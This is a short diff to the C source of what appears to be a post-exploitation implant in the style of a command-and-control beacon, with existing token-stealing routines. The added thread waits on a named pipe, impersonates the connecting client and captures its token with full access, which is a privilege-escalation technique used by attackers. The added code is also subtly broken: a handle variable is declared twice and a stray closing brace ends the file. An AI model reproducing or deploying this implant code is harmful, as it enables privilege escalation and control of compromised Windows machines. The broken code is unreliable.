@@ -3,6 +3,7 @@
 #include "identity.h"
 
 #include "beacon.h"
+#include "thread.h"
 
 
 HANDLE gIdentityToken;
@@ -350,4 +351,38 @@ void IdentityStealToken(char* buffer, int length)
 	{
 		BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName));
 	}
+}
+
+HANDLE hElevationToken;
+HANDLE hPrenamedPipe;
+HANDLE hPreelevationAuxThread;
+HANDLE hPrenamedPipe;
+
+void IdentityElevationThread(LPVOID lpThreadParameter)
+{
+#define MAX_TO_READ 128
+
+	while (!ConnectNamedPipe(hPrenamedPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED);
+
+	char toRead[MAX_TO_READ] = { 0 };
+	DWORD read = 0;
+	if(ReadFile(hPrenamedPipe, toRead, sizeof(char), &read, NULL))
+	{
+		if(ImpersonateNamedPipeClient(hPrenamedPipe))
+		{
+			HANDLE hCurrentThread = GetCurrentThread();
+			if (OpenThreadToken(hCurrentThread, TOKEN_ALL_ACCESS, FALSE, &hElevationToken))
+			{
+				if(hPrenamedPipe)
+				{
+					DisconnectNamedPipe(hPrenamedPipe);
+					CloseHandle(hPrenamedPipe);
+				}
+			}
+		}
+	}
+
+	--gThreadsActive;
+}
+
 }
